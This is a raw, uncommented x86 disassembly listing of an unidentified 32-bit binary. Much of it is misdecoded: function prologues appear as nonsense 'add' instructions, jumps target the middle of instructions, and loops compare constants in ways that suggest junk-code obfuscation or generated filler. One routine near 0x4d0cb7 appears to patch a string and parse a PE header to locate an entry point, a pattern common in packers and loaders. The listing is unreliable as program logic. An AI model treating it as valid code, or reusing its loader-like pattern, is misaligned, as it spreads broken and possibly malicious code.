  4d079b:	call   0x4d0d80
  4d07a0:	add    esp,0x4
  4d07a3:	pop    edi
  4d07a4:	push   edi
  4d07a5:	push   esi
  4d07a6:	push   ebx
  4d07a7:	call   0x4d1470
  4d07ac:	add    esp,0x8
  4d07af:	pop    edi
  4d07b0:	push   edi
  4d07b1:	call   0x4d1158
  4d07b6:	add    esp,0x4
  4d07b9:	pop    edi
  4d07ba:	add    esp,0x44
  4d07bd:	pop    ebp
  4d07be:	ret    
  4d07bf:	add    BYTE PTR [edi-0x1],bl
  4d07c2:	adc    eax,0x4d2034
  4d07c7:	call   edi
  4d07c9:	add    BYTE PTR [eax],al
  4d07cb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07d1:	sub    esp,0x2c
  4d07d4:	mov    esi,0x4d3064
  4d07d9:	mov    DWORD PTR [ebp-0xc],esi
  4d07dc:	push   esi
  4d07dd:	push   DWORD PTR [esi+0x18c]
  4d07e3:	push   ecx
  4d07e4:	push   edx
  4d07e5:	call   0x4d0f3c
  4d07ea:	add    esp,0xc
  4d07ed:	pop    esi
  4d07ee:	push   0x0
  4d07f0:	call   0x4d1360
  4d07f5:	add    esp,0x4
  4d07f8:	push   0x0
  4d07fa:	call   0x4d1164
  4d07ff:	add    esp,0x4
  4d0802:	add    esp,0x2c
  4d0805:	pop    ebp
  4d0806:	ret    
  4d0807:	add    BYTE PTR [edi-0x1],bl
  4d080a:	adc    eax,0x4d2098
  4d080f:	call   edi
  4d0811:	add    BYTE PTR [eax],al
  4d0813:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0819:	sub    esp,0x5c
  4d081c:	lea    ebx,ds:0x4d3158
  4d0822:	cmp    ebx,0x3ce
  4d0828:	jbe    0x4d0817
  4d082a:	mov    edx,0x0
  4d082f:	push   edx
  4d0830:	call   0x4d0864
  4d0835:	add    esp,0x4
  4d0838:	push   ebx
  4d0839:	push   DWORD PTR [ebx+0x98]
  4d083f:	push   esi
  4d0840:	push   DWORD PTR [ebx+0x1a8]
  4d0846:	call   0x4d0fc8
  4d084b:	add    esp,0xc
  4d084e:	pop    ebx
  4d084f:	mov    edx,0x4d2034
  4d0854:	mov    edx,DWORD PTR [edx]
  4d0856:	push   edx
  4d0857:	push   DWORD PTR [ebx-0x64]
  4d085a:	pop    edx
  4d085b:	call   edx
  4d085d:	add    esp,0x5c
  4d0860:	pop    ebp
  4d0861:	ret    
  4d0862:	add    BYTE PTR [eax],al
  4d0864:	pop    edi
  4d0865:	call   DWORD PTR ds:0x4d2028
  4d086b:	call   edi
  4d086d:	add    BYTE PTR [eax],al
  4d086f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0875:	sub    esp,0x28
  4d0878:	lea    edx,ds:0x4d31a4
  4d087e:	sbb    DWORD PTR [ebp-0x18],ebx
  4d0881:	push   edx
  4d0882:	push   DWORD PTR [edx+0x94]
  4d0888:	push   DWORD PTR [edx+0x70]
  4d088b:	push   eax
  4d088c:	push   ebx
  4d088d:	call   0x4d1114
  4d0892:	add    esp,0x10
  4d0895:	pop    edx
  4d0896:	push   edx
  4d0897:	push   0x0
  4d0899:	call   0x4d1070
  4d089e:	add    esp,0x4
  4d08a1:	pop    edx
  4d08a2:	push   edx
  4d08a3:	mov    ecx,0xfffffff4
  4d08a8:	push   ecx
  4d08a9:	call   0x4d1108
  4d08ae:	add    esp,0x4
  4d08b1:	pop    edx
  4d08b2:	add    esp,0x28
  4d08b5:	pop    ebp
  4d08b6:	ret    
  4d08b7:	add    BYTE PTR [edi-0x1],bl
  4d08ba:	adc    eax,0x4d2020
  4d08bf:	call   edi
  4d08c1:	add    BYTE PTR [eax],al
  4d08c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08c9:	sub    esp,0x3c
  4d08cc:	mov    esi,0x4d3074
  4d08d1:	adc    edx,DWORD PTR [ebp-0xc]
  4d08d4:	push   0x0
  4d08d6:	call   0x4d13b8
  4d08db:	add    esp,0x4
  4d08de:	push   esi
  4d08df:	push   DWORD PTR [esi+0x6c]
  4d08e2:	push   DWORD PTR [esi+0xbc]
  4d08e8:	push   DWORD PTR [esi+0x70]
  4d08eb:	call   0x4d11c0
  4d08f0:	add    esp,0xc
  4d08f3:	pop    esi
  4d08f4:	call   0x4d1158
  4d08f9:	add    esp,0x4
  4d08fc:	add    esp,0x3c
  4d08ff:	pop    ebp
  4d0900:	ret    
  4d0901:	add    BYTE PTR [eax],al
  4d0903:	add    BYTE PTR [edi-0x1],bl
  4d0906:	adc    eax,0x4d2060
  4d090b:	call   edi
  4d090d:	add    BYTE PTR [eax],al
  4d090f:	add    BYTE PTR [edi-0x1],bl
  4d0912:	adc    eax,0x4d2018
  4d0917:	call   edi
  4d0919:	add    BYTE PTR [eax],al
  4d091b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0921:	sub    esp,0x58
  4d0924:	lea    eax,ds:0x4d30e8
  4d092a:	adc    DWORD PTR [eax+0x90],eax
  4d0930:	push   eax
  4d0931:	push   DWORD PTR [eax+0x98]
  4d0937:	push   ebx
  4d0938:	push   esi
  4d0939:	call   0x4d0ce8
  4d093e:	add    esp,0xc
  4d0941:	pop    eax
  4d0942:	push   eax
  4d0943:	push   0x0
  4d0945:	call   0x4d1458
  4d094a:	add    esp,0x4
  4d094d:	pop    eax
  4d094e:	push   eax
  4d094f:	lea    edx,[eax-0xe8]
  4d0955:	push   edx
  4d0956:	call   0x4d07c0
  4d095b:	add    esp,0x4
  4d095e:	test   eax,eax
  4d0960:	jne    0x4d094f
  4d0962:	pop    eax
  4d0963:	add    esp,0x58
  4d0966:	pop    ebp
  4d0967:	ret    
  4d0968:	mov    edi,edi
  4d096a:	push   ebp
  4d096b:	mov    ebp,esp
  4d096d:	sub    esp,0x44
  4d0970:	lea    edx,[eax-0x6c]
  4d0973:	add    esi,eax
  4d0975:	push   edx
  4d0976:	call   0x4d1158
  4d097b:	add    esp,0x4
  4d097e:	pop    edx
  4d097f:	push   edx
  4d0980:	push   edi
  4d0981:	push   DWORD PTR [edx+0x1a0]
  4d0987:	push   DWORD PTR [edx+0x6c]
  4d098a:	call   0x4d091c
  4d098f:	add    esp,0xc
  4d0992:	pop    edx
  4d0993:	push   edx
  4d0994:	push   0x0
  4d0996:	call   0x4d11b4
  4d099b:	add    esp,0x4
  4d099e:	pop    edx
  4d099f:	add    esp,0x44
  4d09a2:	pop    ebp
  4d09a3:	ret    
  4d09a4:	pop    edi
  4d09a5:	call   DWORD PTR ds:0x4d2068
  4d09ab:	call   edi
  4d09ad:	add    BYTE PTR [eax],al
  4d09af:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09b5:	sub    esp,0x30
  4d09b8:	mov    ebx,0x4d30a4
  4d09bd:	xor    DWORD PTR [ebp-0x2c],eax
  4d09c0:	push   ebx
  4d09c1:	push   edx
  4d09c2:	push   edi
  4d09c3:	push   edi
  4d09c4:	call   0x4d0738
  4d09c9:	add    esp,0xc
  4d09cc:	pop    ebx
  4d09cd:	lea    esi,[ebx-0xa4]
  4d09d3:	push   esi
  4d09d4:	call   0x4d07c0
  4d09d9:	add    esp,0x4
  4d09dc:	test   eax,eax
  4d09de:	jne    0x4d09ce
  4d09e0:	mov    ecx,0x0
  4d09e5:	push   ecx
  4d09e6:	call   0x4d11b4
  4d09eb:	add    esp,0x4
  4d09ee:	add    esp,0x30
  4d09f1:	pop    ebp
  4d09f2:	ret    
  4d09f3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09f9:	sub    esp,0x50
  4d09fc:	mov    ebx,0x4d3110
  4d0a01:	cmp    ebx,0x4ae5
  4d0a07:	jb     0x4d09f7
  4d0a09:	push   ebx
  4d0a0a:	push   DWORD PTR [ebx+0x1c4]
  4d0a10:	push   edi
  4d0a11:	push   ecx
  4d0a12:	call   0x4d11fc
  4d0a17:	add    esp,0xc
  4d0a1a:	pop    ebx
  4d0a1b:	mov    ecx,0x0
  4d0a20:	push   ecx
  4d0a21:	call   0x4d1164
  4d0a26:	add    esp,0x4
  4d0a29:	mov    edi,0x0
  4d0a2e:	push   edi
  4d0a2f:	call   0x4d1360
  4d0a34:	add    esp,0x4
  4d0a37:	add    esp,0x50
  4d0a3a:	pop    ebp
  4d0a3b:	ret    
  4d0a3c:	mov    edi,edi
  4d0a3e:	push   ebp
  4d0a3f:	mov    ebp,esp
  4d0a41:	sub    esp,0x38
  4d0a44:	mov    ecx,0x4d307c
  4d0a49:	add    DWORD PTR [ecx+0x2c],0xffff816e
  4d0a50:	push   ecx
  4d0a51:	call   0x4d1158
  4d0a56:	add    esp,0x4
  4d0a59:	pop    ecx
  4d0a5a:	push   ecx
  4d0a5b:	push   DWORD PTR [ecx+0xac]
  4d0a61:	push   edi
  4d0a62:	call   0x4d09f4
  4d0a67:	add    esp,0x8
  4d0a6a:	pop    ecx
  4d0a6b:	push   ecx
  4d0a6c:	mov    ebx,0x0
  4d0a71:	push   ebx
  4d0a72:	call   0x4d0e70
  4d0a77:	add    esp,0x4
  4d0a7a:	pop    ecx
  4d0a7b:	add    esp,0x38
  4d0a7e:	pop    ebp
  4d0a7f:	ret    
  4d0a80:	mov    edi,edi
  4d0a82:	push   ebp
  4d0a83:	mov    ebp,esp
  4d0a85:	sub    esp,0x34
  4d0a88:	lea    ebx,ds:0x4d309c
  4d0a8e:	cmp    ebx,0x5d74
  4d0a94:	jb     0x4d0a83
  4d0a96:	call   0x4d1158
  4d0a9b:	add    esp,0x4
  4d0a9e:	push   ebx
  4d0a9f:	push   DWORD PTR [ebx+0x18]
  4d0aa2:	push   edx
  4d0aa3:	call   0x4d0ac0
  4d0aa8:	add    esp,0x8
  4d0aab:	pop    ebx
  4d0aac:	mov    edi,0x0
  4d0ab1:	push   edi
  4d0ab2:	call   0x4d1070
  4d0ab7:	add    esp,0x4
  4d0aba:	add    esp,0x34
  4d0abd:	pop    ebp
  4d0abe:	ret    
  4d0abf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ac5:	sub    esp,0x5c
  4d0ac8:	lea    eax,ds:0x4d31c4
  4d0ace:	adc    DWORD PTR [eax-0x14c],0xffffffa2
  4d0ad5:	push   eax
  4d0ad6:	call   0x4d08b8
  4d0adb:	add    esp,0x4
  4d0ade:	pop    eax
  4d0adf:	push   eax
  4d0ae0:	push   DWORD PTR [eax+0x15c]
  4d0ae6:	push   ecx
  4d0ae7:	push   ecx
  4d0ae8:	push   DWORD PTR [eax+0x14c]
  4d0aee:	call   0x4d0f84
  4d0af3:	add    esp,0x10
  4d0af6:	pop    eax
  4d0af7:	push   eax
  4d0af8:	push   0x0
  4d0afa:	call   0x4d0864
  4d0aff:	add    esp,0x4
  4d0b02:	pop    eax
  4d0b03:	add    esp,0x5c
  4d0b06:	pop    ebp
  4d0b07:	ret    
  4d0b08:	pop    edi
  4d0b09:	call   DWORD PTR ds:0x4d2048
  4d0b0f:	call   edi
  4d0b11:	add    BYTE PTR [eax],al
  4d0b13:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b19:	sub    esp,0x50
  4d0b1c:	lea    esi,[edx-0xa8]
  4d0b22:	xor    eax,DWORD PTR [ebp-0x20]
  4d0b25:	push   esi
  4d0b26:	push   edi
  4d0b27:	push   DWORD PTR [esi+0x190]
  4d0b2d:	push   DWORD PTR [esi+0x1f4]
  4d0b33:	call   0x4d0dfc
  4d0b38:	add    esp,0xc
  4d0b3b:	pop    esi
  4d0b3c:	call   0x4d0910
  4d0b41:	add    esp,0x4
  4d0b44:	mov    ecx,0x0
  4d0b49:	push   ecx
  4d0b4a:	call   0x4d11b4
  4d0b4f:	add    esp,0x4
  4d0b52:	add    esp,0x50
  4d0b55:	pop    ebp
  4d0b56:	ret    
  4d0b57:	add    BYTE PTR [edi-0x1],bl
  4d0b5a:	adc    eax,0x4d2064
  4d0b5f:	call   edi
  4d0b61:	add    BYTE PTR [eax],al
  4d0b63:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b69:	sub    esp,0x20
  4d0b6c:	mov    edi,0x4d3108
  4d0b71:	sbb    DWORD PTR [ebp-0x14],0xffffffbf
  4d0b75:	push   edi
  4d0b76:	push   0x0
  4d0b78:	call   0x4d1164
  4d0b7d:	add    esp,0x4
  4d0b80:	pop    edi
  4d0b81:	push   edi
  4d0b82:	push   DWORD PTR [edi+0xf4]
  4d0b88:	push   ebx
  4d0b89:	push   edx
  4d0b8a:	call   0x4d1010
  4d0b8f:	add    esp,0xc
  4d0b92:	pop    edi
  4d0b93:	push   edi
  4d0b94:	push   0x0
  4d0b96:	call   0x4d1164
  4d0b9b:	add    esp,0x4
  4d0b9e:	pop    edi
  4d0b9f:	add    esp,0x20
  4d0ba2:	pop    ebp
  4d0ba3:	ret    
  4d0ba4:	mov    edi,edi
  4d0ba6:	push   ebp
  4d0ba7:	mov    ebp,esp
  4d0ba9:	sub    esp,0x48
  4d0bac:	lea    eax,[edx+0x24]
  4d0baf:	adc    DWORD PTR [ebp-0x2c],esi
  4d0bb2:	push   eax
  4d0bb3:	push   DWORD PTR [eax+0x14]
  4d0bb6:	push   esi
  4d0bb7:	push   DWORD PTR [eax+0x90]
  4d0bbd:	call   0x4d0c00
  4d0bc2:	add    esp,0xc
  4d0bc5:	pop    eax
  4d0bc6:	push   eax
  4d0bc7:	mov    edx,0x0
  4d0bcc:	push   edx
  4d0bcd:	call   0x4d1164
  4d0bd2:	add    esp,0x4
  4d0bd5:	pop    eax
  4d0bd6:	push   eax
  4d0bd7:	push   0x0
  4d0bd9:	call   0x4d1360
  4d0bde:	add    esp,0x4
  4d0be1:	pop    eax
  4d0be2:	add    esp,0x48
  4d0be5:	pop    ebp
  4d0be6:	ret    
  4d0be7:	add    BYTE PTR [edi-0x1],bl
  4d0bea:	adc    eax,0x4d2090
  4d0bef:	call   edi
  4d0bf1:	add    BYTE PTR [eax],al
  4d0bf3:	add    BYTE PTR [edi-0x1],bl
  4d0bf6:	adc    eax,0x4d2054
  4d0bfb:	call   edi
  4d0bfd:	add    BYTE PTR [eax],al
  4d0bff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c05:	sub    esp,0x40
  4d0c08:	mov    ecx,0x4d3164
  4d0c0d:	and    ebx,0x55
  4d0c10:	push   ecx
  4d0c11:	mov    edx,0x0
  4d0c16:	push   edx
  4d0c17:	call   0x4d1458
  4d0c1c:	add    esp,0x4
  4d0c1f:	pop    ecx
  4d0c20:	push   ecx
  4d0c21:	push   edx
  4d0c22:	push   ebx
  4d0c23:	push   DWORD PTR [ecx+0x108]
  4d0c29:	call   0x4d06ec
  4d0c2e:	add    esp,0xc
  4d0c31:	pop    ecx
  4d0c32:	push   ecx
  4d0c33:	push   0x0
  4d0c35:	call   0x4d11b4
  4d0c3a:	add    esp,0x4
  4d0c3d:	pop    ecx
  4d0c3e:	add    esp,0x40
  4d0c41:	pop    ebp
  4d0c42:	ret    
  4d0c43:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c49:	sub    esp,0x5c
  4d0c4c:	lea    edx,ds:0x4d30e8
  4d0c52:	adc    edi,0x6e50
  4d0c58:	push   edx
  4d0c59:	mov    esi,0x0
  4d0c5e:	push   esi
  4d0c5f:	call   0x4d1360
  4d0c64:	add    esp,0x4
  4d0c67:	pop    edx
  4d0c68:	push   edx
  4d0c69:	push   DWORD PTR [edx+0x24]
  4d0c6c:	push   edi
  4d0c6d:	push   DWORD PTR [edx+0xec]
  4d0c73:	push   esi
  4d0c74:	call   0x4d0b14
  4d0c79:	add    esp,0x10
  4d0c7c:	pop    edx
  4d0c7d:	push   edx
  4d0c7e:	mov    ebx,0x0
  4d0c83:	push   ebx
  4d0c84:	call   0x4d1464
  4d0c89:	add    esp,0x4
  4d0c8c:	pop    edx
  4d0c8d:	add    esp,0x5c
  4d0c90:	pop    ebp
  4d0c91:	ret    
  4d0c92:	add    BYTE PTR [eax],al
  4d0c94:	push   edi
  4d0c95:	sub    edi,edi
  4d0c97:	push   edi
  4d0c98:	push   edi
  4d0c99:	push   edi
  4d0c9a:	push   edi
  4d0c9b:	call   0x4d08b8
  4d0ca0:	sub    esp,0xfffffffc
  4d0ca3:	call   0x4d1248
  4d0ca8:	push   0x2
  4d0caa:	xor    eax,eax
  4d0cac:	dec    eax
  4d0cad:	and    eax,0x4d3030
  4d0cb2:	push   0x0
  4d0cb4:	lea    ecx,[eax+0x6]
  4d0cb7:	add    BYTE PTR [ecx],0x41
  4d0cba:	push   eax
  4d0cbb:	call   0x4d1064
  4d0cc0:	pop    edi
  4d0cc1:	pop    edi
  4d0cc2:	pop    edi
  4d0cc3:	lea    edi,[eax+0x3b]
  4d0cc6:	mov    edi,DWORD PTR [edi]
  4d0cc8:	lea    eax,[eax+edi*1]
  4d0ccb:	mov    eax,DWORD PTR [eax+0x28]
  4d0cce:	pusha  
  4d0ccf:	mov    ah,0x45
  4d0cd1:	sub    al,ah
  4d0cd3:	ja     0x4d0814
  4d0cd9:	popa   
  4d0cda:	ret    
  4d0cdb:	add    BYTE PTR [edi-0x1],bl
  4d0cde:	adc    eax,0x4d20a0
  4d0ce3:	call   edi
  4d0ce5:	add    BYTE PTR [eax],al
  4d0ce7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ced:	sub    esp,0x5c
  4d0cf0:	lea    ecx,ds:0x4d3030
  4d0cf6:	and    eax,DWORD PTR [ecx+0x10c]
  4d0cfc:	push   ecx
  4d0cfd:	push   0x0
  4d0cff:	call   0x4d0d80
  4d0d04:	add    esp,0x4
  4d0d07:	pop    ecx
  4d0d08:	push   ecx
  4d0d09:	push   DWORD PTR [ecx+0xa8]
  4d0d0f:	push   DWORD PTR [ecx+0xd0]
  4d0d15:	call   0x4d0a80
  4d0d1a:	add    esp,0x8
  4d0d1d:	pop    ecx
  4d0d1e:	push   ecx
  4d0d1f:	mov    edx,0x0
  4d0d24:	push   edx
  4d0d25:	call   0x4d0d80
  4d0d2a:	add    esp,0x4
  4d0d2d:	pop    ecx
  4d0d2e:	add    esp,0x5c
  4d0d31:	pop    ebp
  4d0d32:	ret    
  4d0d33:	add    BYTE PTR [edi-0x1],bl
  4d0d36:	adc    eax,0x4d2094
  4d0d3b:	call   edi
  4d0d3d:	add    BYTE PTR [eax],al
  4d0d3f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d45:	sub    esp,0x30
  4d0d48:	mov    esi,0x4d30b4
  4d0d4d:	xor    DWORD PTR [esi+0x2c],0xffffffec
  4d0d51:	push   0x0
  4d0d53:	call   0x4d1464
  4d0d58:	add    esp,0x4
  4d0d5b:	push   esi
  4d0d5c:	push   DWORD PTR [esi+0x130]
  4d0d62:	push   edi
  4d0d63:	call   0x4d12dc
  4d0d68:	add    esp,0x8
  4d0d6b:	pop    esi
  4d0d6c:	mov    edi,0x0
  4d0d71:	push   edi
  4d0d72:	call   0x4d0e70
  4d0d77:	add    esp,0x4
  4d0d7a:	add    esp,0x30
  4d0d7d:	pop    ebp
  4d0d7e:	ret    
  4d0d7f:	add    BYTE PTR [edi-0x1],bl
  4d0d82:	adc    eax,0x4d2078
  4d0d87:	call   edi
  4d0d89:	add    BYTE PTR [eax],al
  4d0d8b:	add    BYTE PTR [edi-0x1],bl
  4d0d8e:	adc    eax,0x4d2008
  4d0d93:	call   edi
  4d0d95:	add    BYTE PTR [eax],al
  4d0d97:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d9d:	sub    esp,0x44
  4d0da0:	lea    esi,ds:0x4d3058
  4d0da6:	mov    DWORD PTR [esi+0x148],0xffffffbf
  4d0db0:	push   esi
  4d0db1:	push   edx
  4d0db2:	push   DWORD PTR [esi+0x104]
  4d0db8:	call   0x4d1170
  4d0dbd:	add    esp,0x8
  4d0dc0:	pop    esi
  4d0dc1:	mov    ebx,0x0
  4d0dc6:	push   ebx
  4d0dc7:	call   0x4d1458
  4d0dcc:	add    esp,0x4
  4d0dcf:	lea    edi,[esi-0x58]
  4d0dd2:	push   edi
  4d0dd3:	call   0x4d07c0
  4d0dd8:	add    esp,0x4
  4d0ddb:	test   eax,eax
  4d0ddd:	jne    0x4d0dd0
  4d0ddf:	add    esp,0x44
  4d0de2:	pop    ebp
  4d0de3:	ret    
  4d0de4:	pop    edi
  4d0de5:	call   DWORD PTR ds:0x4d205c
  4d0deb:	call   edi
  4d0ded:	add    BYTE PTR [eax],al
  4d0def:	add    BYTE PTR [edi-0x1],bl
  4d0df2:	adc    eax,0x4d2080
  4d0df7:	call   edi
  4d0df9:	add    BYTE PTR [eax],al
  4d0dfb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e01:	sub    esp,0x4c
  4d0e04:	lea    edx,ds:0x4d301c
  4d0e0a:	and    DWORD PTR [ebp-0x14],0xffffbc61
  4d0e11:	push   edx
  4d0e12:	lea    eax,[edx-0x1c]
  4d0e15:	push   eax
  4d0e16:	call   0x4d07c0
  4d0e1b:	add    esp,0x4
  4d0e1e:	test   eax,eax
  4d0e20:	jne    0x4d0e12
  4d0e22:	pop    edx
  4d0e23:	push   edx
  4d0e24:	push   DWORD PTR [edx+0x18]
  4d0e27:	push   DWORD PTR [edx+0xc8]
  4d0e2d:	push   DWORD PTR [edx+0x58]
  4d0e30:	push   DWORD PTR [edx+0x12c]
  4d0e36:	call   0x4d08c4
  4d0e3b:	add    esp,0x10
  4d0e3e:	pop    edx
  4d0e3f:	push   edx
  4d0e40:	lea    edx,[edx-0x1c]
  4d0e43:	push   edx
  4d0e44:	call   0x4d07c0
  4d0e49:	add    esp,0x4
  4d0e4c:	test   eax,eax
  4d0e4e:	jne    0x4d0e40
  4d0e50:	pop    edx
  4d0e51:	add    esp,0x4c
  4d0e54:	pop    ebp
  4d0e55:	ret    
  4d0e56:	add    BYTE PTR [eax],al
  4d0e58:	pop    edi
  4d0e59:	call   DWORD PTR ds:0x4d2058
  4d0e5f:	call   edi
  4d0e61:	add    BYTE PTR [eax],al
  4d0e63:	add    BYTE PTR [edi-0x1],bl
  4d0e66:	adc    eax,0x4d2014
  4d0e6b:	call   edi
  4d0e6d:	add    BYTE PTR [eax],al
  4d0e6f:	add    BYTE PTR [edi-0x1],bl
  4d0e72:	adc    eax,0x4d2070
  4d0e77:	call   edi
  4d0e79:	add    BYTE PTR [eax],al
  4d0e7b:	add    BYTE PTR [edi-0x1],bl
  4d0e7e:	adc    eax,0x4d209c
  4d0e83:	call   edi
  4d0e85:	add    BYTE PTR [eax],al
  4d0e87:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e8d:	sub    esp,0x40
  4d0e90:	lea    edx,[edi+0x140]
  4d0e96:	sbb    DWORD PTR [edx-0xb8],ecx
  4d0e9c:	push   edx
  4d0e9d:	mov    edx,0x0
  4d0ea2:	push   edx
  4d0ea3:	call   0x4d1464
  4d0ea8:	add    esp,0x4
  4d0eab:	pop    edx
  4d0eac:	push   edx
  4d0ead:	push   eax
  4d0eae:	push   DWORD PTR [edx+0x144]
  4d0eb4:	push   DWORD PTR [edx+0x13c]
  4d0eba:	push   ecx
  4d0ebb:	call   0x4d107c
  4d0ec0:	add    esp,0x10
  4d0ec3:	pop    edx
  4d0ec4:	push   edx
  4d0ec5:	mov    ecx,0xfffffff4
  4d0eca:	push   ecx
  4d0ecb:	call   0x4d1108
  4d0ed0:	add    esp,0x4
  4d0ed3:	pop    edx
  4d0ed4:	add    esp,0x40
  4d0ed7:	pop    ebp
  4d0ed8:	ret    
  4d0ed9:	add    BYTE PTR [eax],al
  4d0edb:	add    BYTE PTR [edi-0x1],bl
  4d0ede:	adc    eax,0x4d2074
  4d0ee3:	call   edi
  4d0ee5:	add    BYTE PTR [eax],al
  4d0ee7:	add    BYTE PTR [edi-0x1],bl
  4d0eea:	adc    eax,0x4d207c
  4d0eef:	call   edi
  4d0ef1:	add    BYTE PTR [eax],al
  4d0ef3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ef9:	sub    esp,0x54
  4d0efc:	lea    edi,ds:0x4d3014
  4d0f02:	xor    eax,DWORD PTR [edi+0x11c]
  4d0f08:	push   edi
  4d0f09:	mov    edi,0x0
  4d0f0e:	push   edi
  4d0f0f:	call   0x4d1458
  4d0f14:	add    esp,0x4
  4d0f17:	pop    edi
  4d0f18:	push   edi
  4d0f19:	push   DWORD PTR [edi+0x48]
  4d0f1c:	push   DWORD PTR [edi+0x13c]
  4d0f22:	push   eax
  4d0f23:	call   0x4d0e88
  4d0f28:	add    esp,0xc
  4d0f2b:	pop    edi
  4d0f2c:	push   edi
  4d0f2d:	call   0x4d08b8
  4d0f32:	add    esp,0x4
  4d0f35:	pop    edi
  4d0f36:	add    esp,0x54
  4d0f39:	pop    ebp
  4d0f3a:	ret    
  4d0f3b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f41:	sub    esp,0x4c
  4d0f44:	mov    ecx,0x4d311c
  4d0f49:	and    DWORD PTR [ebp-0x18],edi
  4d0f4c:	push   ecx
  4d0f4d:	push   ebx
  4d0f4e:	push   edx
  4d0f4f:	call   0x4d0d40
  4d0f54:	add    esp,0x8
  4d0f57:	pop    ecx
  4d0f58:	push   ecx
  4d0f59:	push   0x0
  4d0f5b:	call   0x4d11b4
  4d0f60:	add    esp,0x4
  4d0f63:	pop    ecx
  4d0f64:	push   ecx
  4d0f65:	push   0x0
  4d0f67:	call   0x4d13b8
  4d0f6c:	add    esp,0x4
  4d0f6f:	pop    ecx
  4d0f70:	add    esp,0x4c
  4d0f73:	pop    ebp
  4d0f74:	ret    
  4d0f75:	add    BYTE PTR [eax],al
  4d0f77:	add    BYTE PTR [edi-0x1],bl
  4d0f7a:	adc    eax,0x4d2088
  4d0f7f:	call   edi
  4d0f81:	add    BYTE PTR [eax],al
  4d0f83:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f89:	sub    esp,0x5c
  4d0f8c:	mov    ecx,0x4d316c
  4d0f91:	adc    DWORD PTR [ebp-0x38],edi
  4d0f94:	push   ecx
  4d0f95:	push   esi
  4d0f96:	push   DWORD PTR [ecx+0x168]
  4d0f9c:	push   eax
  4d0f9d:	call   0x4d0870
  4d0fa2:	add    esp,0xc
  4d0fa5:	pop    ecx
  4d0fa6:	push   ecx
  4d0fa7:	push   0x0
  4d0fa9:	call   0x4d13b8
  4d0fae:	add    esp,0x4
  4d0fb1:	pop    ecx
  4d0fb2:	push   ecx
  4d0fb3:	mov    ebx,0x0
  4d0fb8:	push   ebx
  4d0fb9:	call   0x4d11b4
  4d0fbe:	add    esp,0x4
  4d0fc1:	pop    ecx
  4d0fc2:	add    esp,0x5c
  4d0fc5:	pop    ebp
  4d0fc6:	ret    
  4d0fc7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fcd:	sub    esp,0x50
  4d0fd0:	lea    ecx,[ebx-0xcc]
  4d0fd6:	adc    edx,edi
  4d0fd8:	push   ecx
  4d0fd9:	push   DWORD PTR [ecx]
  4d0fdb:	push   DWORD PTR [ecx+0x54]
  4d0fde:	push   edi
  4d0fdf:	call   0x4d0d98
  4d0fe4:	add    esp,0xc
  4d0fe7:	pop    ecx
  4d0fe8:	push   ecx
  4d0fe9:	push   0x0
  4d0feb:	call   0x4d1458
  4d0ff0:	add    esp,0x4
  4d0ff3:	pop    ecx
  4d0ff4:	push   ecx
  4d0ff5:	lea    ebx,[ecx-0x8c]
  4d0ffb:	push   ebx
  4d0ffc:	call   0x4d07c0
  4d1001:	add    esp,0x4
  4d1004:	test   eax,eax
  4d1006:	jne    0x4d0ff5
  4d1008:	pop    ecx
  4d1009:	add    esp,0x50
  4d100c:	pop    ebp
  4d100d:	ret    
  4d100e:	add    BYTE PTR [eax],al
  4d1010:	mov    edi,edi
  4d1012:	push   ebp
  4d1013:	mov    ebp,esp
  4d1015:	sub    esp,0x4c
  4d1018:	lea    ecx,ds:0x4d31a4
  4d101e:	cmp    ecx,0x6fc0
  4d1024:	jb     0x4d1013
  4d1026:	push   ecx
  4d1027:	push   DWORD PTR [ecx+0xf0]
  4d102d:	push   DWORD PTR [ecx+0x1d0]
  4d1033:	call   0x4d0780
  4d1038:	add    esp,0x8
  4d103b:	pop    ecx
  4d103c:	push   ecx
  4d103d:	call   0x4d08b8
  4d1042:	add    esp,0x4
  4d1045:	pop    ecx
  4d1046:	push   ecx
  4d1047:	call   0x4d0910
  4d104c:	add    esp,0x4
  4d104f:	pop    ecx
  4d1050:	add    esp,0x4c
  4d1053:	pop    ebp
  4d1054:	ret    
  4d1055:	add    BYTE PTR [eax],al
  4d1057:	add    BYTE PTR [edi-0x1],bl
  4d105a:	adc    eax,0x4d206c
  4d105f:	call   edi
  4d1061:	add    BYTE PTR [eax],al
  4d1063:	add    BYTE PTR [edi-0x1],bl
  4d1066:	adc    eax,0x4d202c
  4d106b:	call   edi
  4d106d:	add    BYTE PTR [eax],al
  4d106f:	add    BYTE PTR [edi-0x1],bl
  4d1072:	adc    eax,0x4d200c
  4d1077:	call   edi
  4d1079:	add    BYTE PTR [eax],al
  4d107b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1081:	sub    esp,0x4c
  4d1084:	mov    edi,0x4d300c
  4d1089:	cmp    edi,0x3c89
  4d108f:	jbe    0x4d107f
  4d1091:	push   edi
  4d1092:	mov    ecx,0x0
  4d1097:	push   ecx
  4d1098:	call   0x4d0864
  4d109d:	add    esp,0x4
  4d10a0:	pop    edi
  4d10a1:	push   edi
  4d10a2:	push   DWORD PTR [edi+0x1f0]
  4d10a8:	push   esi
  4d10a9:	push   edx
  4d10aa:	call   0x4d131c
  4d10af:	add    esp,0xc
  4d10b2:	pop    edi
  4d10b3:	push   edi
  4d10b4:	push   0x0
  4d10b6:	call   0x4d1464
  4d10bb:	add    esp,0x4
  4d10be:	pop    edi
  4d10bf:	add    esp,0x4c
